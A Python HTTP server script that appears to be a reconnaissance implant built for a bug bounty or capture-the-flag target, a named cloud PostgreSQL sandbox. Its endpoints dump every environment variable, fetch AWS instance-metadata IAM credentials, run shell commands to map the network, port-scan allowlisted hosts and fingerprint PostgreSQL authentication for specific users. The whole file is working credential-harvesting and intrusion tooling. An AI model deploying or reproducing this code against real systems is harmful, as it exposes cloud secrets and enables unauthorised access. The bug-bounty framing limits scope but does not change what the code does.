import os, socket, struct, ssl, json
from http.server import BaseHTTPRequestHandler, HTTPServer

FALCON = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
ALLOW_HOSTS = {FALCON, "129.213.97.171", "10.1.0.204", "10.1.47.111", "public-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", "dr-public-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", "dr-falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com", "n-falcon-bug-bounty-flag-pgsql-4.e.aivencloud.com", "falcon-bug-bounty-flag-pgsql-4.dev-sandbox.aiven.local"}
ALLOW_PORTS = {22, 80, 443, 5432, 12691, 12692, 8080, 21911, 21912, 9701, 9680, 9955}

def sh(cmd, t=5):
    import subprocess
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:1500]
    except Exception as e:
        return f"ERR {e}"

def imds(path, t=4):
    import urllib.request
    try:
        req = urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT",
                                     headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
        try:
            tok = urllib.request.urlopen(req, timeout=2).read().decode()
        except Exception as e:
            tok = ""
        headers = {"X-aws-ec2-metadata-token": tok} if tok else {}
        req = urllib.request.Request(f"http://169.254.169.254/latest/{path}", headers=headers)
        return urllib.request.urlopen(req, timeout=t).read().decode()[:800]
    except Exception as e:
        return f"ERR {type(e).__name__}: {str(e)[:120]}"

def tcp_probe(host, port, t=4):
    if host not in ALLOW_HOSTS or port not in ALLOW_PORTS:
        return "REFUSED (hors allowlist)"
    try:
        s = socket.create_connection((host, port), timeout=t)
        s.settimeout(2)
        try: banner = s.recv(64)
        except Exception: banner = b""
        s.close()
        return f"OPEN banner={banner[:32]!r}"
    except Exception as e:
        return f"{type(e).__name__}: {str(e)[:60]}"

def pg_auth_type(host, port, user, db, use_ssl=True, timeout=6):
    if host not in ALLOW_HOSTS: return "REFUSED (hors allowlist)"
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            raw.sendall(struct.pack("!II", 8, 80877103))
            r = raw.recv(1)
            if r != b"S": return f"ssl-refused({r!r})"
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(raw, server_hostname=FALCON)
        else:
            s = raw
        ps = b"user\x00" + user.encode() + b"\x00database\x00" + db.encode() + b"\x00\x00"
        s.sendall(struct.pack("!I", 8 + len(ps)) + struct.pack("!I", 196608) + ps)
        hdr = s.recv(5)
        t = hdr[0:1]
        ln = struct.unpack("!I", hdr[1:5])[0]
        body = s.recv(ln - 4) if ln > 4 else b""
        s.close()
        if t == b"R" and len(body) >= 4:
            code = struct.unpack("!I", body[:4])[0]
            names = {0: "TRUST", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM"}
            extra = body[4:8].hex() if code == 5 else ""
            return f"{names.get(code, code)} salt={extra}"
        return f"msg={t!r} body={body[:60]!r}"
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        p = self.path
        if p == "/env":
            env = {k: (v[:200] + "...TRUNC" if len(v) > 200 else v) for k, v in sorted(os.environ.items())}
            self.wfile.write(json.dumps(env, indent=1).encode())
        elif p == "/imds":
            out = {k: imds(v) for k, v in [("iam","meta-data/iam/info"),("role","meta-data/iam/security-credentials/"),("identity","dynamic/instance-identity/document"),("hostname","hostname"),("localips","local-ipv4"),("publicips","public-ipv4"),("macs","macs")]}
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/net":
            out = {"hostname": sh("hostname"), "ip": sh("ip addr 2>/dev/null || ifconfig"),
                   "route": sh("ip route 2>/dev/null || route -n"),
                   "resolve_falcon": sh(f"getent hosts {FALCON} || nslookup {FALCON}"),
                   "dns_server": sh("cat /etc/resolv.conf")}
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p.startswith("/probe"):
            from urllib.parse import urlparse, parse_qs
            q = parse_qs(urlparse(p).query)
            host = (q.get("host") or [""])[0]
            ports = [int(x) for x in (q.get("ports") or ["22,5432,12691,12692"])[0].split(",") if x.isdigit()]
            out = {f"{host}:{pt}": tcp_probe(host, pt) for pt in ports}
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/pg":
            from urllib.parse import urlparse, parse_qs
            q = parse_qs(urlparse(p).query)
            host = q.get("host",[FALCON])[0]
            out = [f"{host}@12691 avnadmin ssl -> {pg_auth_type(host,12691,'avnadmin','postgres')}",
                   f"{host}@12691 ctf ssl -> {pg_auth_type(host,12691,'ctf','defaultdb')}",
                   f"{host}@12691 ctf no-ssl -> {pg_auth_type(host,12691,'ctf','defaultdb',use_ssl=False)}"]
            self.wfile.write("\n".join(out).encode())
        else:
            self.wfile.write(b"/env /imds /pg /net /probe")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever()
